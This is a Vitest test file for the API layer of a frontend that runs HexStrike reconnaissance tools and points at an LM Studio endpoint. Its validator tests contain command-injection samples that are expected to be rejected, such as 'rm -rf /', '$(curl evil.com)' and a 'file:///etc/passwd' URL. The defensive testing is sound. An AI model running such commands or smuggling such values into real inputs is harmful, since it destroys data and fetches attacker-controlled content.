import { describe, it, expect, vi, afterEach } from 'vitest'
import {
  validateTarget,
  sanitizeOptions,
  normalizeHexstrikeBase,
  coerceHexstrikeUrlInput,
  legacyToolNameToRouteSegment,
  toolRouteCandidates,
  executeHexstrikeTool,
  fetchHexstrikeTools,
  ToolValidationError,
  parsePackageInstallSpec,
  buildPackageInstallCommand,
  hexstrikeToolTriggersCatalogRefresh,
  hexstrikeV6UsesDomainField,
  ensureLmStudioApiBase,
} from '../api'

describe('ensureLmStudioApiBase', () => {
  it('appends /v1 to a bare LM Studio host (the common paste case)', () => {
    expect(ensureLmStudioApiBase('http://localhost:1234')).toBe('http://localhost:1234/v1')
  })
  it('strips trailing slashes before appending /v1', () => {
    expect(ensureLmStudioApiBase('http://localhost:1234/')).toBe('http://localhost:1234/v1')
  })
  it('leaves an existing /v1 suffix untouched', () => {
    expect(ensureLmStudioApiBase('http://localhost:1234/v1')).toBe('http://localhost:1234/v1')
  })
  it('preserves any /vN version suffix', () => {
    expect(ensureLmStudioApiBase('http://host:5000/v2')).toBe('http://host:5000/v2')
  })
  it('falls back to the LM Studio default when empty', () => {
    expect(ensureLmStudioApiBase('')).toBe('http://localhost:1234/v1')
    expect(ensureLmStudioApiBase(undefined)).toBe('http://localhost:1234/v1')
  })
  it('handles a custom host:port without scheme munging', () => {
    expect(ensureLmStudioApiBase('http://192.168.1.50:1234')).toBe('http://192.168.1.50:1234/v1')
  })
})

describe('validateTarget', () => {
  it('accepts a normal domain', () => {
    const r = validateTarget('example.com')
    expect(r.ok).toBe(true)
    expect(r.value).toBe('example.com')
  })

  it('strips control characters', () => {
    const r = validateTarget('exa\u0001mple.com')
    expect(r.ok).toBe(true)
    expect(r.value).toBe('example.com')
  })

  it('rejects shell metacharacters', () => {
    const r = validateTarget('example.com; rm -rf /')
    expect(r.ok).toBe(false)
  })

  it('rejects overly long input', () => {
    const r = validateTarget('a'.repeat(2_000))
    expect(r.ok).toBe(false)
  })

  it('warns (does not block) on private IP by default', () => {
    const r = validateTarget('192.168.1.1', 'ip')
    expect(r.ok).toBe(true)
    expect(r.warnings.length).toBeGreaterThan(0)
  })

  it('blocks private IP when blockPrivate is set', () => {
    const r = validateTarget('192.168.1.1', 'ip', { blockPrivate: true })
    expect(r.ok).toBe(false)
  })

  it('rejects non-http URL schemes', () => {
    const r = validateTarget('file:///etc/passwd', 'url')
    expect(r.ok).toBe(false)
  })

  it('accepts an https URL', () => {
    const r = validateTarget('https://example.com/path', 'url')
    expect(r.ok).toBe(true)
  })

  it('rejects out-of-range IPv4 octets', () => {
    expect(validateTarget('999.1.1.1', 'ip').ok).toBe(false)
    expect(validateTarget('1.2.3.256', 'ip').ok).toBe(false)
  })

  it('rejects IPv4 with leading-zero octets', () => {
    expect(validateTarget('01.02.03.04', 'ip').ok).toBe(false)
  })

  it('rejects malformed CIDR (out-of-range octet)', () => {
    expect(validateTarget('300.1.1.1/24', 'cidr').ok).toBe(false)
  })

  it('rejects out-of-range CIDR prefix', () => {
    expect(validateTarget('10.0.0.0/33', 'cidr').ok).toBe(false)
    expect(validateTarget('::/999', 'cidr').ok).toBe(false)
  })

  it('accepts a valid IPv4 CIDR', () => {
    expect(validateTarget('10.0.0.0/24', 'cidr').ok).toBe(true)
  })

  it('rejects URLs whose host is a structurally-invalid IPv4', () => {
    expect(validateTarget('http://999.999.999.999/', 'url').ok).toBe(false)
  })
})

describe('sanitizeOptions', () => {
  it('passes valid flags through', () => {
    const r = sanitizeOptions('--threads 50 -p-')
    expect(r.ok).toBe(true)
    expect(r.value).toContain('--threads')
  })

  it('rejects shell metacharacters', () => {
    const r = sanitizeOptions('--out $(curl evil.com)')
    expect(r.ok).toBe(false)
  })

  it('rejects overlong options', () => {
    const r = sanitizeOptions('a'.repeat(5_000))
    expect(r.ok).toBe(false)
  })

  it('returns empty for empty input', () => {
    expect(sanitizeOptions('').value).toBe('')
    expect(sanitizeOptions(null).value).toBe('')
  })
})

describe('normalizeHexstrikeBase', () => {
  it('returns empty for empty (same-origin /api)', () => {
    expect(normalizeHexstrikeBase('')).toBe('')
  })

  it('strips trailing slashes', () => {
    expect(normalizeHexstrikeBase('http://127.0.0.1:8888/')).toBe('http://127.0.0.1:8888')
  })

  it('normalizes docker-style relative base', () => {
    expect(normalizeHexstrikeBase('/api/')).toBe('')
  })
})

describe('toolRouteCandidates', () => {
  it('hyphenates then offers suffix-stripped fallback', () => {
    expect(toolRouteCandidates('nmap_scan')).toEqual(['nmap-scan', 'nmap'])
    expect(toolRouteCandidates('subfinder_enum')).toEqual(['subfinder-enum', 'subfinder'])
    expect(toolRouteCandidates('arp_scan')).toEqual(['arp-scan', 'arp'])
  })
})

describe('hexstrikeV6UsesDomainField', () => {
  it('is true for amass, subfinder, assetfinder, and findomain tool names', () => {
    expect(hexstrikeV6UsesDomainField('amass_enum')).toBe(true)
    expect(hexstrikeV6UsesDomainField('amass-enum')).toBe(true)
    expect(hexstrikeV6UsesDomainField('subfinder_enum')).toBe(true)
    expect(hexstrikeV6UsesDomainField('assetfinder_enum')).toBe(true)
    expect(hexstrikeV6UsesDomainField('findomain_scan')).toBe(true)
  })

  it('is false for other tools', () => {
    expect(hexstrikeV6UsesDomainField('nmap_scan')).toBe(false)
    expect(hexstrikeV6UsesDomainField('theharvester_osint')).toBe(false)
  })
})

describe('legacyToolNameToRouteSegment', () => {
  it('returns last resort segment', () => {
    expect(legacyToolNameToRouteSegment('nmap_scan')).toBe('nmap')
    expect(legacyToolNameToRouteSegment('arp_scan')).toBe('arp')
  })
})

describe('coerceHexstrikeUrlInput', () => {
  it('prepends http:// for bare host:port (browser would otherwise treat as relative)', () => {
    expect(coerceHexstrikeUrlInput('127.0.0.1:8888/api')).toBe('http://127.0.0.1:8888/api')
  })

  it('leaves same-origin path alone', () => {
    expect(coerceHexstrikeUrlInput('/api')).toBe('/api')
    expect(coerceHexstrikeUrlInput('/api/')).toBe('/api')
  })

  it('leaves full URLs alone (strips trailing slash)', () => {
    expect(coerceHexstrikeUrlInput('https://example.com/api/')).toBe('https://example.com/api')
  })

  it('returns empty for whitespace', () => {
    expect(coerceHexstrikeUrlInput('  \t')).toBe('')
  })
})

describe('parsePackageInstallSpec', () => {
  it('parses manager:pkg1,pkg2 target', () => {
    const s = parsePackageInstallSpec('apt:nmap,nuclei')
    expect(s.manager).toBe('apt')
    expect(s.packages).toEqual(['nmap', 'nuclei'])
  })

  it('parses JSON in params.raw', () => {
    const s = parsePackageInstallSpec('-', {
      raw: JSON.stringify({ manager: 'pip', packages: ['requests'] }),
    })
    expect(s.manager).toBe('pip')
    expect(s.packages).toEqual(['requests'])
  })

  it('rejects invalid package tokens', () => {
    expect(() => parsePackageInstallSpec('apt:nmap;rm -rf /')).toThrow(ToolValidationError)
  })
})

describe('buildPackageInstallCommand', () => {
  it('builds apt and apk commands', () => {
    expect(
      buildPackageInstallCommand({ manager: 'apt', packages: ['nmap', 'curl'] })
    ).toContain('apt-get install')
    expect(buildPackageInstallCommand({ manager: 'apk', packages: ['nmap'] })).toContain('apk add')
  })
})

describe('hexstrikeToolTriggersCatalogRefresh', () => {
  it('returns true only for install and catalog sync tools', () => {
    expect(hexstrikeToolTriggersCatalogRefresh('hexstrike_install_packages')).toBe(true)
    expect(hexstrikeToolTriggersCatalogRefresh('hexstrike_refresh_catalog')).toBe(true)
    expect(hexstrikeToolTriggersCatalogRefresh('hexstrike_system_health')).toBe(false)
    expect(hexstrikeToolTriggersCatalogRefresh('nmap_scan')).toBe(false)
  })
})

describe('executeHexstrikeTool', () => {
  afterEach(() => {
    vi.unstubAllGlobals()
    vi.restoreAllMocks()
  })

  it('throws ToolValidationError for invalid target', async () => {
    await expect(executeHexstrikeTool('', 'nmap', 'example.com; evil')).rejects.toBeInstanceOf(
      ToolValidationError
    )
  })

  it('returns JSON from /api/execute when OK', async () => {
    const payload = { ok: true, out: 'scan complete' }
    const fetchMock = vi.fn().mockResolvedValue({
      ok: true,
      status: 200,
      json: async () => payload,
    })
    vi.stubGlobal('fetch', fetchMock)

    const out = await executeHexstrikeTool('http://127.0.0.1:8888', 'nmap', 'example.com')
    expect(out).toEqual(payload)
    expect(fetchMock).toHaveBeenCalledWith(
      'http://127.0.0.1:8888/api/execute',
      expect.objectContaining({
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
      })
    )
  })

  it('falls back to v6 POST /api/tools/<segment> when /api/execute returns 404', async () => {
    const v6Payload = { route: 'v6-tool', data: [1] }
    const fetchMock = vi
      .fn()
      .mockResolvedValueOnce({
        ok: false,
        status: 404,
        text: async () => 'not found',
      })
      .mockResolvedValueOnce({
        ok: true,
        status: 200,
        json: async () => v6Payload,
        text: async () => JSON.stringify(v6Payload),
      })
    vi.stubGlobal('fetch', fetchMock)

    const out = await executeHexstrikeTool('http://127.0.0.1:8888', 'nmap_scan', 'example.com')
    expect(out).toEqual(v6Payload)
    expect(fetchMock.mock.calls[1][0]).toContain('/api/tools/')
    expect(fetchMock.mock.calls[1][0]).toContain('nmap-scan')
    const body = JSON.parse((fetchMock.mock.calls[1][1] as { body: string }).body)
    expect(body.target).toBe('example.com')
  })

  it('v6 fallback sends domain for amass_enum (HexStrike expects domain, not target)', async () => {
    const v6Payload = { ok: true }
    const fetchMock = vi
      .fn()
      .mockResolvedValueOnce({
        ok: false,
        status: 404,
        text: async () => 'not found',
      })
      .mockResolvedValueOnce({
        ok: true,
        status: 200,
        json: async () => v6Payload,
        text: async () => JSON.stringify(v6Payload),
      })
    vi.stubGlobal('fetch', fetchMock)

    await executeHexstrikeTool('http://127.0.0.1:8888', 'amass_enum', 'example.com')
    const body = JSON.parse((fetchMock.mock.calls[1][1] as { body: string }).body)
    expect(body.domain).toBe('example.com')
    expect(body.target).toBeUndefined()
  })

  it('hexstrike_install_packages posts a validated command to /api/command', async () => {
    const fetchMock = vi.fn().mockResolvedValue({
      ok: true,
      status: 200,
      text: async () => '{"ok":true}',
      json: async () => ({ ok: true }),
    })
    vi.stubGlobal('fetch', fetchMock)

    const out = await executeHexstrikeTool(
      'http://127.0.0.1:8888',
      'hexstrike_install_packages',
      'apt:curl'
    )
    expect(out).toEqual({ ok: true })
    expect(fetchMock.mock.calls[0][0]).toBe('http://127.0.0.1:8888/api/command')
    const body = JSON.parse((fetchMock.mock.calls[0][1] as { body: string }).body)
    expect(body.command).toContain('apt-get install')
    expect(body.use_cache).toBe(false)
  })

  it('hexstrike_system_health GETs /health', async () => {
    const health = { tools_status: { nmap: true } }
    const fetchMock = vi.fn().mockResolvedValue({
      ok: true,
      status: 200,
      json: async () => health,
    })
    vi.stubGlobal('fetch', fetchMock)

    const out = await executeHexstrikeTool(
      'http://127.0.0.1:8888',
      'hexstrike_system_health',
      '-'
    )
    expect(out).toEqual(health)
    expect(fetchMock.mock.calls[0][0]).toBe('http://127.0.0.1:8888/health')
  })
})

describe('fetchHexstrikeTools', () => {
  afterEach(() => {
    vi.unstubAllGlobals()
    vi.restoreAllMocks()
  })

  it('parses GET /api/tools catalog JSON', async () => {
    const fetchMock = vi
      .fn()
      .mockResolvedValueOnce({
        ok: true,
        status: 200,
        json: async () => ({ uptime: 1 }),
      })
      .mockResolvedValueOnce({
        ok: true,
        status: 200,
        json: async () => ({
          tools: [{ name: 'nmap_scan', description: 'Port scan', category: 'network_reconnaissance' }],
        }),
      })
    vi.stubGlobal('fetch', fetchMock)

    const { tools, categories } = await fetchHexstrikeTools('http://127.0.0.1:8888')
    expect(fetchMock.mock.calls[0][0]).toContain('/health')
    expect(fetchMock.mock.calls[1][0]).toContain('/api/tools')
    expect(tools).toHaveLength(1)
    expect(tools[0].name).toBe('nmap_scan')
    expect(categories.length).toBeGreaterThan(0)
  })

  it('builds catalog from GET /health tools_status without calling /api/tools', async () => {
    const fetchMock = vi.fn().mockResolvedValue({
      ok: true,
      status: 200,
      json: async () => ({ tools_status: { 'nmap-scan': true, subfinder: true } }),
    })
    vi.stubGlobal('fetch', fetchMock)

    const { tools } = await fetchHexstrikeTools('http://127.0.0.1:8888')
    expect(fetchMock).toHaveBeenCalledTimes(1)
    expect(fetchMock.mock.calls[0][0]).toContain('/health')
    expect(tools.map((t) => t.name).sort()).toEqual(['nmap_scan', 'subfinder'])
  })
})
